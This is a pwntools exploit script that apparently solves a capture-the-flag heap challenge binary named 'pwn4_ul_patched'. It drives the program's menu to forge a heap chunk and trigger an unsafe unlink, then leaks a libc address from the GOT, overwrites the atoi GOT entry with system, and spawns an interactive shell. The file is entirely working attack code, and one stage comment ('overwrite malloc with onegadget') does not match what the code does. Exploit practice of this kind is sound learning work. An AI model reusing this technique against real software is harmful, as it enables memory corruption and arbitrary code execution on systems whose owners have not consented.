from pwn import *
context.binary=exe=ELF("./pwn4_ul_patched",checksec=False)
p=process(exe.path)
def create(idx,size,data):
    p.sendafter(b">\n",b"1")
    p.sendafter(b"Index:",idx)
    p.sendafter(b"Input size:",size)
    p.sendafter(b"Input data:",data)
def show(idx):
    p.sendafter(b">\n",b"2")
    p.sendafter(b"Index:",idx)
def edit(index,newsize,data):
    p.sendafter(b">\n",b"3")
    p.sendafter(b"Input index:",index)
    p.sendlineafter(b"Input newsize:",newsize)
    p.sendlineafter(b"Do you want to change data (y/n)?\n",b"y")
    p.sendafter(b"Input data:",data)
def delete(idx):
    p.sendafter(b">\n",b"4")
    p.sendafter(b"Input index:",idx)
###stage1: #####################################################
store=0x6020e0 +8+8+8
payload=p64(0)+p64(0xa0)+p64(store-24)+p64(store-16)+b"\x00"*128+p64(0xa0)+p64(0xb0)
create(b"0",b"160",b"\x00"*8+b"A"*8)
create(b"1",b"160",b"\x00"*8)
create(b"2",b"160",b"\x00"*8)
create(b"3",b"160",b"\x00"*8)#use this chunk to overflow the under one
create(b"4",b"160",b"\x00"*8)
create(b"5",b"160",b"\x00"*8)

### stage2: strigger unlink  ######################################################

edit(b"3",b"176",payload)
delete(b"4")

#### stage3: leak libc ###########################################################
edit(b"3",b"8",p64(0x602038))
show(b"0")
p.recvuntil(b"Data = ")
libc=int.from_bytes(p.recv(6),"little")-0x4ea70
log.info("[+]libc base"+hex(libc))
#### stage 4 overwrite malloc with onegadget#######
atoi_got=0x602068
system=libc+0x3f550
edit(b"3",b"8",p64(atoi_got))
edit(b"0",b"8",p64(system))
p.sendafter(b">\n",b"/bin/sh")
p.interactive()